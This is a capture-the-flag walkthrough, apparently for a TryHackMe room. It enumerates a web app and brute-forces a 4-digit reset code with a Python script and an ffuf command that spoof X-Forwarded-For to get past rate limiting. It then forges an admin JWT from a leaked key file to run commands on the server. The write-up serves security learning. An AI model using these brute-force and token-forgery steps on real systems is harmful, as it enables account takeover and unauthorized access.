</br> basic scan as always
</br>nmap -sT -p- -T4 10.10.30.177 -v
```
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
```
</br>
</br> nmap 22,1337 -A 10.10.30.177 -v
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
```
</br>1337 doesn't even come up when indicated... umm? maybe http?
![loginPageHammer](https://github.com/user-attachments/assets/5d4d4ab8-fa95-47e7-b300-4a7d02ec5ae9)

</br>looks like  a basic login
</br>in the inspector, I find note about dir names
![hmr_dirname](https://github.com/user-attachments/assets/59c2fa1e-e031-43df-a8ae-1b30567c7d54)

</br> gotta append hmr_ to the start of all items in typical list; 
</br> here, I use sed to accomplish this prepend action, making a new file from reading the previous raft-medium collection
</br>`sed 's/^/hmr_/' /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > modified_wordlist.txt`
![hmrAdded1](https://github.com/user-attachments/assets/482b96da-1a91-4612-925a-21a89fde74e1)
</br>
</br>`gobuster dir -u http://10.10.166.252:3333 -w modified_wordlist.txt`
</br>
</br>
![enumer1](https://github.com/user-attachments/assets/5cd144a8-421f-4f12-ae68-db3624b22438)
</br> check this logs directory ... these unclean logs are revealing info: 
</br>/restricted-area
</br>/var/www/html/protected
</br>/var/www/html/locked-down
</br>/home/hammerthm/test.php
- they're probably running php on the backend if this is in the log
</br>/admin-login
- username:  tester@hammer.thm (who is not the admin)
</br>
</br>(these files are not on the web-server, as the extensions are not accessible via the browser and also don't fit the web dev practice shown thus far of adding that hmr_ in front.)
  ![notherw23r32](https://github.com/user-attachments/assets/361b7b68-482a-4627-8091-49f678dbb632)

</br>going back to enumerated dirs thus far...
</br>checking /images
</br>
</br> gimme that --> `wget http://10.10.30.177:1337/hmr_images/hammer.webp`
</br>![okayWhyTho](https://github.com/user-attachments/assets/c8e83dd9-6941-416e-93bd-5507b2cfbb96)
![thisIsWhatGetsCalledWhenYOuRightClickSaveAsPleb](https://github.com/user-attachments/assets/2609cc01-027e-4b0a-90c2-fe9153c53769)

</br> should run raft against our web portal in the meantime, just to check for slipped names
</br> `gobuster dir -u http://10.10.30.177:1337 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt`
</br> ![thereareOthers3](https://github.com/user-attachments/assets/b4a4344b-3f41-4ea5-88c7-24e5175f1741)

</br> beyond that list, further enum found:
</br>`http://http://10.10.30.177:1337/reset_password.php` exists
</br>

</br> burp to intercept the call
![1234543](https://github.com/user-attachments/assets/5d0ba9bd-f8cd-4183-9c2a-378a1e40cd08)
</br> input name...
![inputSide1](https://github.com/user-attachments/assets/eea52505-b4ce-460f-832a-f89c678bd32e)
</br> check response...
![inputSide2](https://github.com/user-attachments/assets/d00cfcc7-af1a-46b6-bd11-b202e5459e92)
</br> well, at least it's good sanitization
</br> the leaked test@hammer.thm did not trigger a different message from asdf@a.com; no leads there
![goodSanitationHere2](https://github.com/user-attachments/assets/489624f8-8290-4662-8361-23bbf68c250a)
</br> checking `/reset_password.php`
![eatMyDcinergierng](https://github.com/user-attachments/assets/8673fe9d-fa5b-4c36-9b78-c7ce68b2e4c9)

</br>if this is sending out a password reset code, then maybe we can intercept it with burpsuite 
![testeratTHM](https://github.com/user-attachments/assets/db65003a-a543-4caa-bab5-223bbab5fc3c)
</br> oh dear me, this is on a timer (fudge, this is gonna be filthy to try and take screencaps of...) 
</br> send a random 4-digit code and send to repeater to check out the response formatting
![ebguinergwerg](https://github.com/user-attachments/assets/8caa2499-7e17-416c-919b-7dcf21c7e6b4)
</br>  ok, I need a session id
<h3>  INTENTION: </h3>
- Make a python program to go through all the digits randomly
- stop when the correct one is sent
- use requests to send them all
- check responses to confirm the correct one got a hit
- be sure to use the SESSION ID
- pray

![beirwgnerger](https://github.com/user-attachments/assets/1c181ad2-0551-4229-839c-a69c546b63e3)

</br> rate limited?
![wereFuckingSmokedBois](https://github.com/user-attachments/assets/9655741c-0334-4297-b561-88c1e8270e30)

</br> updates:
- dynamically type in session id instead of chaning hard-coding
- X-Forwarded-For - randomized to avoid lockout
</br>
</br> doing more testing payloads...
</br>
</br> hour later, python not working. The machine spirits are not satisfied.
</br>broken python if you want 2 hours of my life and 5 years off my lifespan...

```import requests
import random
import time
import threading
  
# Target URL
url = "http://10.10.30.177:1337/reset_password.php"

# User-Agents to randomize requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

mySessionid = input("sessid > ")
#asked for by input satement ^^
# ex: 7qk86mqscsat197o2jal3h4j50

# Headers template
headers_template = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.30.177:1337",
    "Connection": "keep-alive",
    "Referer": "http://10.10.30.177:1337/reset_password.php",
    "Cookie": f"PHPSESSID={mySessionid}",
    "Upgrade-Insecure-Requests": "1"
}
# Generate all possible 4-digit codes and shuffle them
codes = [str(i).zfill(4) for i in range(10000)]
random.shuffle(codes)

# Shared variable to stop threads when a correct code is found
found = False
found_lock = threading.Lock()

def attempt_code(code):
    global found
    if found:
        return
    data = {"recovery_code": code, "s": "168"}
    headers = headers_template.copy()
    headers["User-Agent"] = random.choice(user_agents)
    headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    response = requests.post(url, headers=headers, data=data)
    if "Success" in response.text or "Password reset" in response.text:
        with found_lock:
            if not found:
                found = True
                print(f"Correct code found: {code}")
                exit(0)
    print(f"Tried: {code}")
    time.sleep(random.uniform(0.1, 0.3))

# Create and start threads
threads = []
for code in codes:
    thread = threading.Thread(target=attempt_code, args=(code,))
    thread.start()
    threads.append(thread)
    if found:
        break

# Wait for all threads to complete
for thread in threads:
    thread.join()
```

</br> let's try another way
</br> make a manual txt file with all 4 digit codes 
</br> 
</br> `seq -w 0000 9999 >> codes.txt`
</br> 
</br>  using ffuf, we must randomize X-Forwarded-For or else get blocked by rate limit
</br> (also, new ip address because over 2 hrs used, new machine needed launching)
</br> `ffuf -u http://10.10.204.172:1337/reset_password.php -w codes.txt -X "POST" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: FUZZ" -H "Cookie: PHPSESSID=1lnhe4l8k1vnphbgiqtu51u3ef" -d "recovery_code=FUZZ" -fr "Invalid"`
</br> 
</br> note: the process is tricky 
</br> 1) set the http:// to whatever your target ip is
</br> 2)  go to the password recovery /reset_password.php
</br> 3)  turn on burpsuite interceptor and put in a set of 4 numbers
</br> 4)  grab the session id from burpsuite. paste it into the ffuf syntax above (as long as you have ~50 seconds left on the clock it will auto trigger the digit reset)
</br> 5) set a new password
</br> 
</br> in-progress hack in this manner will show attempts
</br>  there is a "change password" option that triggers after the correct sequence is put in
</br> You MUST enter in a dummy code to get things to reset after you run ffuf, or else screen won't refresh and let you through
![couldn'tCaptureButTh](https://github.com/user-attachments/assets/7e271e1d-9d79-4767-82e0-cd2da042c068)

![gottapumpindumytoreset](https://github.com/user-attachments/assets/03888d01-b21c-4943-aad4-2a33f3db18e3)
</br> it says invalid, but now we got 2 fields
</br> give a dummy password like 123 and move on
</br> login with the new creds

![welcomefuddd](https://github.com/user-attachments/assets/966f5a5b-88f0-4bc5-ad5d-d28828fc8f80)
</br> got some kind of input field on the page with the user flag...
</br> okay, now I'm getting booted out after a few seconds, so WTF?
</br> (no cap available for this flashing back out to the login screen... hard to show)
</br> argh, another timer in a cookie.
1)open right click menu and inspect the page
2) go to storage
3) open cookies
4) go to persistent session
5) change the day up by a few to boost longevity of sessions
![ewqbwuerew](https://github.com/user-attachments/assets/289cca6a-acda-4bde-bdb5-f30782f071dc)
</br> to be clear "persistent session" and the numeral for days can be updated and it'll auto-update the rest
![increaseTo11TOGiveFewHours](https://github.com/user-attachments/assets/33e95573-8a3c-4deb-b196-1d344d257e96)
</br> in our input field, try commands, I lucked out on `ls`
</br> we find some kind of key at the top
![niceKey1](https://github.com/user-attachments/assets/e9b29b7d-3eb6-4daf-a2fc-fbf11948191e)

</br> There's a kind of validation for files with JWT 
</br> we're only really interested in the auth field in the cap below
![authAndTokenGot324](https://github.com/user-attachments/assets/5ed69fab-f6f0-4316-8923-687e53e12e72)

</br> 
</br> saved multiple versions of the key, burning a lot of tie, but eventually learned the essence:
</br> it needs 3 parts : use the site `jwt.ioi` to convert the jwt information into editable stuff on the right
1) use key file in /var/www/html/188ade1.key (top)
2) use "admin" as role (mid)
3) get your secret code from the key file we got from the server
  ![copySecretAmount](https://github.com/user-attachments/assets/a58e988a-b304-4088-9a7f-8d86c4b4cf9d)
4) input secret key code in cyan part for "verify signature (bottom)
![i23bur23r](https://github.com/user-attachments/assets/2a50d0ba-4380-48d2-b877-cabc08cb7021)
 </br> top and mid ^^
 ![inputsecretshit](https://github.com/user-attachments/assets/877b6fbb-c519-42d2-ab9b-82207d0a2471)
 </br> bottom before ^^
 ![inut23r](https://github.com/user-attachments/assets/ae9d8dd4-49a1-40fa-b63c-a548c40ddb2b)
</br> bottom after ^^
</br>
 </br> documented key content : `56058354efb3daa97ebab00fabd7a7d7`
 </br>
 </br> full JWT token for injection, documented: (Which I've not seen in other walkthroughs, when this is CLEARLY essential)
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM4NTQ4NTg3LCJleHAiOjE3Mzg1NTIxODcsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.Q--Sg4HKxp2KwjDNJCjm8atUo0qhM8JZCDJcrjoSf4A`
</br>
</br> use burpsuite to capture a junk command, hit enter, like doing "ls" again (just make sure intercept is on)
</br> send it to repeater
</br>
![ybeuigbwreugorieg](https://github.com/user-attachments/assets/c23dc98f-ecbe-48f2-82af-e20e918c61c9)
![executionewtio34nt](https://github.com/user-attachments/assets/bf421c8c-2573-4beb-a911-33dbd90a29bc)
</br>
</br> update our header token with the crafted JWT as documented above, which changes us to admin and uses that secret key for authentication.
</br> proof that we can now send any command -->
</br> the goal was to read a specific file, as shown in the screencap (blurred out the answer to the room)
</br>
![otput34changCOMMAND](https://github.com/user-attachments/assets/805b08b0-6b71-455e-bf7f-df1ef099ec1e)
